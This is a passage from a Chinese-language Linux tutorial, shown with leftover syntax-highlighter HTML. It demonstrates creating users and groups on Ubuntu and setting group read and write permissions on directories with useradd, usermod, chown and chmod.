发行版完成你所需要做的一切。本文的重点是用户组，所以不会涉及到关于用户的基础知识。</p>\n<p>为了达到演示的目的，我将假设：</p>\n<p>你需要用下面两个用户名新建两个用户：</p>\n<ul>\n<li>olivia</li>\n<li>nathan</li>\n</ul>\n<p>你需要新建以下两个用户组：</p>\n<ul>\n<li>readers</li>\n<li>editors</li>\n</ul>\n<p>olivia 属于 editors 用户组，而 nathan 属于 readers 用户组。reader 用户组对 <code>/DATA</code> 目录只有读的权限，而 editors 用户组则对 <code>/DATA</code> 目录同时有读和写的权限。当然，这是个非常小的任务，但它会给你基本的信息，你可以扩展这个任务以适应你其他更大的需求。</p>\n<p>我将在 Ubuntu 16.04 Server 平台上进行演示。这些命令都是通用的，唯一不同的是，要是在你的发行版中不使用 <code>sudo</code> 命令，你必须切换到 root 用户来执行这些命令。</p>\n<h3 id=\"toc_1\">创建用户</h3>\n<p>我们需要做的第一件事是为我们的实验创建两个用户。可以用 <code>useradd</code> 命令来创建用户，我们不只是简单地创建一个用户，而需要同时创建用户和属于他们的家目录，然后给他们设置密码。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b61f589445253\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo useradd -m olivia\r\nsudo useradd -m nathan\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b61f589445253-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b61f589445253-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b61f589445253-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b61f589445253-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">useradd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">olivia</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b61f589445253-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">useradd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nathan</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1f7b61f589445253-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们现在创建了两个用户，如果你看看 <code>/home</code> 目录，你可以发现他们的家目录（因为我们用了 <code>-m</code> 选项，可以在创建用户的同时创建他们的家目录。</p>\n<p>之后，我们可以用以下命令给他们设置密码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b628157961625\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo passwd olivia\r\nsudo passwd nathan\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b628157961625-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b628157961625-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b628157961625-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b628157961625-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">passwd </span><span class=\"crayon-e\">olivia</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b628157961625-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">passwd </span><span class=\"crayon-i\">nathan</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1f7b628157961625-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>就这样，我们创建了两个用户。</p>\n<h3 id=\"toc_2\">创建用户组并添加用户</h3>\n<p>现在我们将创建 readers 和 editors 用户组，然后给它们添加用户。创建用户组的命令是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b62d827418183\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\naddgroup readers\r\naddgroup editors\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b62d827418183-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b62d827418183-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b62d827418183-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b62d827418183-1\"><span class=\"crayon-e\">addgroup </span><span class=\"crayon-e\">readers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b62d827418183-2\"><span class=\"crayon-e\">addgroup </span><span class=\"crayon-i\">editors</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1f7b62d827418183-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>（LCTT 译注：当你使用 CentOS 等一些 Linux 发行版时，可能系统没有 <code>addgroup</code> 这个命令，推荐使用 <code>groupadd</code> 命令来替换 <code>addgroup</code> 命令以达到同样的效果）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/a4aeb9d98d79d707090f46b85e6db25b.jpg\" alt=\"groups\"></p>\n<p><em>图一：我们可以使用刚创建的新用户组了。</em></p>\n<p>创建用户组后，我们需要添加我们的用户到这两个用户组。我们用以下命令来将 nathan 用户添加到 readers 用户组：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b630526053534\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo usermod -a -G readers nathan\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b630526053534-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b630526053534-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b630526053534-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">usermod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">G</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">readers </span><span class=\"crayon-i\">nathan</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b630526053534-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>用以下命令将 olivia 添加到 editors 用户组：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b634088695024\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo usermod -a -G editors olivia\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b634088695024-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b634088695024-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b634088695024-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">usermod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">G</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">editors </span><span class=\"crayon-i\">olivia</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b634088695024-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在我们可以通过用户组来管理用户了。</p>\n<h3 id=\"toc_3\">给用户组授予目录的权限</h3>\n<p>假设你有个目录 <code>/READERS</code> 且允许 readers 用户组的所有成员访问这个目录。首先，我们执行以下命令来更改目录所属用户组：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b637060549619\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo chown -R :readers /READERS \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b637060549619-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b637060549619-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b637060549619-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">chown</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">readers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">READERS</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b637060549619-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>接下来，执行以下命令收回目录所属用户组的写入权限：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b63b332259180\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo chmod -R g-w /READERS\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b63b332259180-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b63b332259180-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b63b332259180-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">READERS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b63b332259180-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后我们执行下面的命令来收回其他用户对这个目录的访问权限（以防止任何不在 readers 组中的用户访问这个目录里的文件）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b63e349769789\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo chmod -R o-x /READERS\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b63e349769789-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b63e349769789-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b63e349769789-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">o</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">READERS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b63e349769789-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这时候，只有目录的所有者（root）和用户组 reader 中的用户可以访问 <code>/READES</code> 中的文件。</p>\n<p>假设你有个目录 <code>/EDITORS</code> ，你需要给用户组 editors 里的成员这个目录的读和写的权限。为了达到这个目的，执行下面的这些命令是必要的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b642385033338\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 